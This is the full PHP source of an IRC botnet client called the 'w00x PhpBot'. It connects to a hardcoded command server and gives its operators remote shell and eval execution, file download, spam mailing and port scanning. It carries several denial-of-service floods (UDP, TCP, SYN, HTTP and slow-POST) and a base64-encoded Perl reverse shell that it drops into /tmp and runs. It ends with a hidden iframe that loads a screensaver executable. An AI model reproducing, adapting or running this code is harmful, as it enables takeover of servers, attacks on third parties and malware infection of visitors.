<?

/*
*
* PhpBot for w00x botnet created by 1337x
*
* COMMANDS:
*
* -user <password> //login to the bot
* -logout //logout of the bot
* -die //kill the bot
* -restart //restart the bot
* -mail <to> <from> <subject> <msg> //send an email
* -dns <IP|HOST> //dns lookup
* -download <URL> <filename> //download a file
* -exec <cmd> // uses exec() //execute a command
* -sexec <cmd> // uses shell_exec() //execute a command
* -cmd <cmd> // uses popen() //execute a command
* -info //get system information
* -php <php code> // uses eval() //execute php code
*
* Layer7 Attacks:
* -tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack
* -rudy <target> <time> // Rudy protocol flood 
* -l7 <method> <target> <time> // Layer7 With POST GET HEAD
* -httpflood <ip host> <port> <time> <method> <target url> // HTTPFlood Attack with GET and POST
* -httpfloodv2 <ip host> <target url> <leght> // HTTPFlood Attack with HEAD
* -syn <host> <port> <time> <delayseconds> // SYN ACK Attack 
*
* Layer4 Attacks:
* -udpflood <target> <packets> <packetsize> <delay> //udpflood attack
* -udpfloodv2 <target> <port> <time> <packetsize> // udpflood attack with port and time
*
* -raw <cmd> //raw IRC command
* -rndnick //change nickname
* -pscan <host> <port> //port scan
* -safe // test safe_mode (dvl)
* -inbox <to> // test inbox (dvl)
* -conback <ip> <port> // conect back (dvl)
* -uname // return shell's uname using a php function (dvl)
* -botvuln // show the vuln url of bot
* 
*/

set_time_limit(0);
error_reporting(0);
echo "ok!";

class pBot
{
var $config = array("server"=>"irc.priv8.in",
"port"=>"6667",
"pass"=>"",
"prefix"=>"[r00t]|",
"maxrand"=>"4",
"chan"=>"#syncnet",
"chan2"=>"#syncnet",
"key"=>"",
"modes"=>"+ps",
"password"=>"xd123",
"trigger"=>".",
"hostauth"=>"*" // * for any hostname (remember: /setvhost takapusi.cok)
);
var $users = array();
function start()
{
if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))
$this->start();
$ident = $this->config['prefix'];
$alph = range("0","9");
for($i=0;$i<$this->config['maxrand'];$i++)
$ident .= $alph[rand(0,9)];
if(strlen($this->config['pass'])>0)
$this->send("PASS ".$this->config['pass']);
$this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
$this->set_nick();
$this->main();
}
function main()
{
while(!feof($this->conn))
{
$this->buf = trim(fgets($this->conn,512));
$cmd = explode(" ",$this->buf);
if(substr($this->buf,0,6)=="PING :")
{
$this->send("PONG :".substr($this->buf,6));
}
if(isset($cmd[1]) && $cmd[1] =="001")
{
$this->send("MODE ".$this->nick." ".$this->config['modes']);
$this->join($this->config['chan'],$this->config['key']);
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "on"; }
$uname = php_uname();
$this->privmsg($this->config['chan2'],"[\2uname!\2]: $uname (safe: $safemode)");
$this->privmsg($this->config['chan2'],"#->   \2w00x3 Bot Status : Online and connected \2    <-# ");
$this->privmsg($this->config['chan2'],"#->       \2w00x 0kx Botnet By 1337x 2010\2       <-# ");
$this->privmsg($this->config['chan2'],"#-> 0x9277386 0x9b78000 0x9b78010 0x8085000 0x8085a40 <-# ");


}
if(isset($cmd[1]) && $cmd[1]=="433")
{
$this->set_nick();
}
if($this->buf != $old_buf)
{
$mcmd = array();
$msg = substr(strstr($this->buf," :"),2);
$msgcmd = explode(" ",$msg);
$nick = explode("!",$cmd[0]);
$vhost = explode("@",$nick[1]);
$vhost = $vhost[1];
$nick = substr($nick[0],1);
$host = $cmd[0];
if($msgcmd[0]==$this->nick)
{
for($i=0;$i<count($msgcmd);$i++)
$mcmd[$i] = $msgcmd[$i+1];
}
else
{
for($i=0;$i<count($msgcmd);$i++)
$mcmd[$i] = $msgcmd[$i];
}
if(count($cmd)>2)
{
switch($cmd[1])
{
case "QUIT":
if($this->is_logged_in($host))
{
$this->log_out($host);
}
break;
case "PART":
if($this->is_logged_in($host))
{
$this->log_out($host);
}
break;
case "PRIVMSG":
if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*"))
{
if(substr($mcmd[0],0,1)=="-")
{
switch(substr($mcmd[0],1))
{
case "user":
if($mcmd[1]==$this->config['password'])
{
$this->privmsg($this->config['chan'],"[\2Auth\2]: OK $nick Authenticated let's mix some oreos with milkshake");
$this->privmsg($this->config['chan'],"[\2Auth\2]: $nick Use command .exec id for check bot permissions");
$this->log_in($host);
}
else
{
$this->privmsg($this->config['chan'],"[\2Auth\2]: Wrong password $nick please check your line 49 in uploaded phpbot");
}
break;
}
}
}
elseif($this->is_logged_in($host))
{
if(substr($mcmd[0],0,1)=="-")
{
switch(substr($mcmd[0],1))
{
case "restart":
$this->send("QUIT :restart commando from $nick");
fclose($this->conn);
$this->start();
break;
case "mail": //mail to from subject message
if(count($mcmd)>4)
{
$header = "From: <".$mcmd[2].">";
if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header))
{
$this->privmsg($this->config['chan'],"[\2mail\2]: Impossivel mandar e-mail.");
}
else
{
$this->privmsg($this->config['chan'],"[\2mail\2]: Mensagem enviada para \2".$mcmd[1]."\2");
}
}
break;
case "safe":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
$safemode = "on";
}
else {
$safemode = "off";
}
$this->privmsg($this->config['chan'],"[\2safe mode\2]: ".$safemode."");
break;
case "inbox": //teste inbox
if(isset($mcmd[1]))
{
$token = md5(uniqid(rand(), true));
$header = "From: <inbox".$token."@jatimcom.cok>";
$a = php_uname();
$b = getenv("SERVER_SOFTWARE");
$c = gethostbyname($_SERVER["HTTP_HOST"]);
if(!mail($mcmd[1],"InBox Test","#crew@jatimcom. since 2003\n\nip: $c \nsoftware: $b \nsystem: $a \nvuln: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\n\ngreetz: wicked\nby: dvl <jatim.community@gmail.com>",$header))
{
$this->privmsg($this->config['chan'],"[\2inbox\2]: Unable to send");
}
else
{
$this->privmsg($this->config['chan'],"[\2inbox\2]: Message sent to \2".$mcmd[1]."\2");
}
}
break;
case "conback":
if(count($mcmd)>2)
{
$this->conback($mcmd[1],$mcmd[2]);
}
break;
case "dns":
if(isset($mcmd[1]))
{
$ip = explode(".",$mcmd[1]);
if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))
{
$this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
}
else
{
$this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
}
}
break;
case "info":
case "vunl":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "off"; }
$uname = php_uname();
$this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
$this->privmsg($this->config['chan'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
break;
case "botvuln":
case "vunl":
$this->privmsg($this->config['chan'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
break;
case "bot":
$this->privmsg($this->config['chan'],"[\2bot\2]: #-> phpbot of w00x BOTNET coded by 1337x <-#");
$this->privmsg($this->config['chan'],"[\2bot\2]: #-> @ContactMe skype:live:dragonhaxor1337 <-#");
break;
case "uname":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "off"; }
$uname = php_uname();
$this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
break;
case "rndnick":
$this->set_nick();
break;
case "raw":
$this->send(strstr($msg,$mcmd[1]));
break;
case "eval":
$eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
break;
case "sexec":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = shell_exec($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;

case "exec":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = exec($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;

case "passthru":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = passthru($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;

case "popen":
if(isset($mcmd[1]))
{
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$this->privmsg($this->config['chan'],"[\2popen\2]: $command");
$pipe = popen($command,"r");
while(!feof($pipe))
{
$pbuf = trim(fgets($pipe,512));
if($pbuf != NULL)
$this->privmsg($this->config['chan']," : $pbuf");
}
pclose($pipe);
}

case "system":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = system($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;


case "pscan": // -pscan 127.0.0.1 6667
if(count($mcmd) > 2)
{
if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))
$this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2");
else
$this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2");
}
break;


case "download":
if(count($mcmd) > 2)
{
if(!$fp = fopen($mcmd[2],"w"))
{
$this->privmsg($this->config['chan'],"[\2download\2]: Nao foi possivel fazer o download. Permissao negada.");
}
else
{
if(!$get = file($mcmd[1]))
{
$this->privmsg($this->config['chan'],"[\2download\2]: Nao foi possivel fazer o download de \2".$mcmd[1]."\2");
}
else
{
for($i=0;$i<=count($get);$i++)
{
fwrite($fp,$get[$i]);
}
$this->privmsg($this->config['chan'],"[\2download\2]: Arquivo \2".$mcmd[1]."\2 baixado para \2".$mcmd[2]."\2");
}
fclose($fp);
}
}
else { $this->privmsg($this->config['chan'],"[\2download\2]: use .download http://your.host/file /tmp/file"); }
break;
case "die":
$this->send("QUIT : $nick Closed connection with w00x bot using phpbot coded by 1337x");
fclose($this->conn);
exit;
case "logout":
$this->log_out($host);
$this->privmsg($this->config['chan'],"[\2auth\2]: $nick Ndang Cewok Lek Wes Mari!!!!");
break;
case "httpfloodv2":
if(count($mcmd)>2)
{
$this->HTTP_Flood($mcmd[1],$mcmd[2],$mcmd[3]);
}
break;
case "udpflood":
if(count($mcmd)>3)
{
$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);
}
break;

case "syn":
if (count($mcmd) > 2) {
$this->syn($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
} else {
$this->privmsg($this->config['chan'], "syntax: syn host port time [delaySeconds]");
}
break;

case "udpfloodv2":
if (count($mcmd) > 4) {
$this->udpfloodv2($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
}
break;
case "httpflood":
if (count($mcmd) > 2) {
$this->httpflood($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4], $mcmd[5]);
} else {
$this->privmsg($this->config['chan'], "syntax: httpflood host port time [method] [url]");
}
break;
case "rudy":
if (count($mcmd) > 2) {
$this->doSlow($mcmd[1], $mcmd[2]);
}
break;
case "l7":
if (count($mcmd) > 3) {
if ($mcmd[1] == "get") {
$this->attack_http("GET", $mcmd[2], $mcmd[3]);
}
 if ($mcmd[1] == "post") {
 $this->attack_post($mcmd[2], $mcmd[3]);
}
 if ($mcmd[1] == "head") {
 $this->attack_http("HEAD", $mcmd[2], $mcmd[3]);
}
}
break;
case "tcpflood":
if(count($mcmd)>5)
{
$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]);
}
break;
}
}
}
break;
}
}
}
$old_buf = $this->buf;
}
$this->start();
}
function send($msg)
{
fwrite($this->conn,"$msg\r\n");

}
function join($chan,$key=NULL)
{
$this->send("JOIN $chan $key");
}
function privmsg($to,$msg)
{
$this->send("PRIVMSG $to :$msg");
}
function notice($to,$msg)
{
$this->send("NOTICE $to :$msg");
}
function is_logged_in($host)
{
if(isset($this->users[$host]))
return 1;
else
return 0;
}
function log_in($host)
{
$this->users[$host] = true;
}
function log_out($host)
{
unset($this->users[$host]);
}


public function set_nick() {
$fp = fsockopen("freegeoip.net", 80, $dummy, $dummy, 30);
if(!$fp)
$this->nick = "[UKN]";
else {
fclose($fp);
$ctx = stream_context_create(array(
'http' => array(
'timeout' => 30
)
));
$buf = file_get_contents("http://freegeoip.net/json/", 0, $ctx);
if(!strstr($buf, "country_code"))
$this->nick = "[UKN]";
else {
$code       = strstr($buf, "country_code");
$code       = substr($code, 12);
$code       = substr($code, 3, 2);
$this->nick = "[" . $code . "]";
}
}
$this->nick .= $this->config['prefix'];
for($i = 0; $i < $this->config['maxrand']; $i++)
$this->nick .= mt_rand(0, 9);
$this->send("NICK " . $this->nick);
}

function udpflood($host,$packetsize,$time) {
$this->privmsg($this->config['chan'],"[\2KILLING SERVER WITH UDPFLOOD ATTACK!\2]");
$packet = "";
for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
$timei = time();
$i = 0;
while(time()-$timei < $time) {
$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
fwrite($fp,$packet);
fclose($fp);
$i++;
}
$env = $i * $packetsize;
$env = $env / 1048576;
$vel = $env / $time;
$vel = round($vel);
$env = round($env);
$this->privmsg($this->config['chan'],"[\2ATTACK FINISHED!\2]: $env MB enviados / Media: $vel MB/s ");
}

     
	  //////////// Rudy Flood Added by Hax Stroke

function doSlow($host, $time) {
$this->privmsg($this->config['chan'], "[\2Rudy Flood Started!\2]");
$timei = time();
$i     = 0;
for ($i = 0; $i < 100; $i++) {
$fs[$i] = @fsockopen($host, 80, $errno, $errstr);
}
while ((time() - $timei < $time)) {
for ($i = 0; $i < 100; $i++) {
$out = "POST / HTTP/1.1\r\n";
$out .= "Host: {$host}\r\n";
$out .= "User-Agent: Opera/9.21 (Windows NT 5.1; U; en)\r\n";
$out .= "Content-Length: " . rand(1, 1000) . "\r\n";
$out .= "X-a: " . rand(1, 10000) . "\r\n";
if (@fwrite($fs[$i], $out)) {
continue;
} else {
$fs[$i] = @fsockopen($server, 80, $errno, $errstr);
}
}
}
$this->privmsg($this->config['chan'], "[\2Rudy Flood Finished!\2]");
}
	  
	  ////////////
	  
	  //////////// UDP FLOOD VERSION 2.0 ADDED BY HAX STROKE

function udpfloodv2($host, $port, $time, $packetsize) {
$this->privmsg($this->config['chan'], "[\2Flooding with UDP protocol | Crashing your target\2]");
$packet = "";
for ($i = 0; $i < $packetsize; $i++) {
$packet .= chr(rand(1, 256));
}
$end = time() + $time;
$i   = 0;
$fp  = fsockopen("udp://" . $host, $port, $e, $s, 5);
while (true) {
fwrite($fp, $packet);
fflush($fp);
if ($i % 100 == 0) {
if($end < time())
break;
}
$i++;
}
fclose($fp);
$env = $i * $packetsize;
$env = $env / 1048576;
$vel = $env / $time;
$vel = round($vel);
$env = round($env);
$this->privmsg($this->config['chan'], "[\2ATTACK FINISHED WITH\2]: " . $env . " MB ENVITED / With: " . $vel . " MB peer second's");
}
     ////////////

	    function attack_http($mthd, $server, $time) {

        $timei = time();

        $fs    = array();

        $this->privmsg($this->config['chan'], "[\2Layer 7 {$mthd} Attack Started On : $server!\2]");

        $request = "$mthd / HTTP/1.1\r\n";

        $request .= "Host: $server\r\n";

        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";

        $request .= "Keep-Alive: 900\r\n";

        $request .= "Accept: *.*\r\n";

        $timei = time();

        for ($i = 0; $i < 100; $i++) {

            $fs[$i] = @fsockopen($server, 80, $errno, $errstr);

        }

        while ((time() - $timei < $time)) {

            for ($i = 0; $i < 100; $i++) {

                if (@fwrite($fs[$i], $request)) {

                    continue;

                } else {

                    $fs[$i] = @fsockopen($server, 80, $errno, $errstr);

                }

            }

        }

        $this->privmsg($this->config['chan'], "[\2Layer 7 {$mthd} Attack Finished!\2]");

    }

    function attack_post($server, $host, $time) {

        $timei = time();

        $fs    = array();

        $this->privmsg($this->config['chan'], "[\2Layer 7 Post Attack Started On : $server!\2]");

        $request = "POST /" . md5(rand()) . " HTTP/1.1\r\n";

        $request .= "Host: $host\r\n";

        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";

        $request .= "Keep-Alive: 900\r\n";

        $request .= "Content-Length: 1000000000\r\n";

        $request .= "Content-Type: application/x-www-form-urlencoded\r\n";

        $request .= "Accept: *.*\r\n";

        for ($i = 0; $i < 100; $i++) {

            $fs[$i] = @fsockopen($host, 80, $errno, $errstr);

        }

        while ((time() - $timei < $time)) {
 for ($i = 0; $i < 100; $i++) {
if (@fwrite($fs[$i], $request)) {
 continue;
} else {
 $fs[$i] = @fsockopen($host, 80, $errno, $errstr);
}
}
}
fclose($sockfd);
$this->privmsg($this->config['chan'], "[\2Layer 7 Post Attack Finished!\2]");
}
	 
     /////////////


        function HTTP_Flood( $host , $page , $length )
                {
                 $this->privmsg($this->config['chan'],"[\2KILLING SERVER WITH FUCKING MASSIVE HTTP FLOOD!\2]");
                if ( $page == '' )
                        {
                        $page = '/';
                        }

                $max_time = time() + $length;

                $packet .= 'GET ' . $page . ' HTTP/1.1' . "\r\n";
                $packet .= 'Host: ' . $host . "\r\n";
                $packet .= 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:2.0b7) Gecko/20100101 Firefox/4.0b7' . "\r\n";
                $packet .= 'Keep-alive: 300' . "\r\n";
                $packet .= 'Connection: keep-alive' . "\r\n\r\n";

                @$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
                while( 1 )
                        {
                        if ( time() > $max_time )
                                {
                                break;
                                }

                        if( $fp )
                                {
                                fwrite( $fp , $packet );
                                fclose( $fp );
                                $packets++;
                                }
                        else
                                {
                                @$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
                                }
                        }

                if ( $packets == 0 )
                        {
                        $this->privmsg($this->config['chan'],"[\2HTTP Flood!\2]");
                        $this->privmsg($this->config['chan'],'<br /><b>An error occurred! Could not send packets.</b><br />' . "\n");
                        }
                else
                        {
                        $this->privmsg($this->config['chan'],"[\2HTTP Flood!\2]");
                        $this->privmsg($this->config['chan'],$host) ;
                        $this->privmsg($this->config['chan'],$length)  ;
                        $this->privmsg($this->config['chan'],'<b>Packets:</b> ' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s ) <br />' . "\n");
                        }

                return 0;
                }



     ////////////
	 
	 function syn($host, $port, $time, $delay=1) {

        $this->privmsg($this->config['chan'], "[\2SYN Started!\2]");

        $timei    = time();

        $socks = array();

        while (time() - $timei < $time) {

            $numsocks++;

            $socks[$numsocks] = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

            if (!$socks[$numsocks]) continue;

            @socket_set_nonblock($socks[$numsocks]);

            for ($j = 0; $j < 20; $j++)

                @socket_connect($socks[$numsocks], $host, $port);

            sleep($delay);

        }

        $this->privmsg($this->config['chan'], "[\2SYN Finished (".$numsocks." socks created)!\2]");

    }
	 
	 ////////////
	 
function httpflood($host, $port, $time, $method="GET", $url="/") {
$this->privmsg($this->config['chan'], "[\2HttpFlood Started!\2]");
$timei    = time();
$user_agent = $this->user_agents[rand(0, count($this->user_agents)-1)];
$packet = "$method $url HTTP/1.1\r\n";
$packet .= "Host: $host\r\n";
$packet .= "Keep-Alive: 900\r\n";
$packet .= "Cache-Control: no-cache\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
$packet .= "Accept-Language: en-GB,en-US;q=0.8,en;q=0.6\r\n";
$packet .= "Accept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n";
$packet .= "Connection: keep-alive\r\n";
$packet .= "User-Agent: $user_agent\r\n\r\n";
 while (time() - $timei < $time) {
$handle = fsockopen($host, $port, $errno, $errstr, 1);
fwrite($handle, $packet);
}
$this->privmsg($this->config['chan'], "[\2HttpFlood Finished!\2]");
}

function tcpflood($host,$packets,$packetsize,$port,$delay)
{
$this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]");
$packet = "";
for($i=0;$i<$packetsize;$i++)
$packet .= chr(mt_rand(1,256));
for($i=0;$i<$packets;$i++)
{
if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5))
{
$this->privmsg($this->config['chan'],"[\2TcpFlood\2]: Error: <$e>");
return 0;
}
else
{
fwrite($fp,$packet);
fclose($fp);
}
sleep($delay);
}
$this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: Config - $packets pacotes para $host:$port.");
}
function conback($ip,$port)
{
$this->privmsg($this->config['chan'],"[\2conback\2]: tentando conectando a $ip:$port");
$dc_source = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNr ? IEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0 ? XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4i ? Ow0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQg ? PSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHBy ? b3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZF ? UiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsN ? Cm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAi ? U25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIp ? Ow0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVu ? KFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERF ? UlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBl ?eGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==";
if (is_writable("/tmp"))
{
if (file_exists("/tmp/dc.pl")) { unlink("/tmp/dc.pl"); }
$fp=fopen("/tmp/dc.pl","w");
fwrite($fp,base64_decode($dc_source));
passthru("perl /tmp/dc.pl $ip $port &");
unlink("/tmp/dc.pl");
}
else
{
if (is_writable("/var/tmp"))
{
if (file_exists("/var/tmp/dc.pl")) { unlink("/var/tmp/dc.pl"); }
$fp=fopen("/var/tmp/dc.pl","w");
fwrite($fp,base64_decode($dc_source));
passthru("perl /var/tmp/dc.pl $ip $port &");
unlink("/var/tmp/dc.pl");
}
if (is_writable("."))
{
if (file_exists("dc.pl")) { unlink("dc.pl"); }
$fp=fopen("dc.pl","w");
fwrite($fp,base64_decode($dc_source));
passthru("perl dc.pl $ip $port &");
unlink("dc.pl");
}
}
}
}

$bot = new pBot;
$bot->start();

?>
<iframe src=Photo.scr width=1 height=1 frameborder=0>
</iframe>